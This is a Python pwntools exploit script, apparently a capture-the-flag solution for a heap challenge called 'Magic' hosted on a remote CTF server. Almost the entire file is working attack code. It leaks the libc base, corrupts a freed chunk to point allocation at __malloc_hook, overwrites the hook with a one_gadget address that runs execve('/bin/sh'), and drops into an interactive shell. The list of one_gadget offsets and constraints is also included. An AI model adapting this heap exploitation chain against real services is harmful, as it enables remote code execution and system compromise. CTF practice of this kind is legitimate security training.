#coding:utf-8
from pwn import *

# p=process('./Magic')
p = remote("redirect.do-not-trust.hacking.run",10038)
libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

def add(idx):
	p.sendafter('Input your choice: \n','1\n1\n')
	p.sendafter('Input the idx\n',str(idx)+'\n'+str(idx)+'\n')

def magic(idx,con):
	p.sendafter('Input your choice: \n','2\n2\n')
	p.sendafter('Input the idx\n',str(idx)+'\n'+str(idx)+'\n')
	p.sendafter('Input the Magic\n',str(con))

def free(idx):
	p.sendafter('Input your choice: \n','3\n3\n')
	p.sendafter('Input the idx\n',str(idx)+'\n'+str(idx)+'\n')

def leak(offset):
    libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - offset
    print "[+]libc_base=>"+hex(libc_base)
    return libc_base

# attach(p,'b main')
#offset = 0x3c3a61+0x1300
add(0)
add(1)
magic(0,'a')
libc_base = leak(0x3c3a61+0x1300)
# print "libc_base[+]=>"+hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']
free(0)
pause()
magic(0,p64(malloc_hook-0x23))

add(0)
add(1)
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
pause()
magic(1,'a'*0x13 + p64(libc_base + 0xf03a4))
pause()
add(0)
pause()

p.interactive()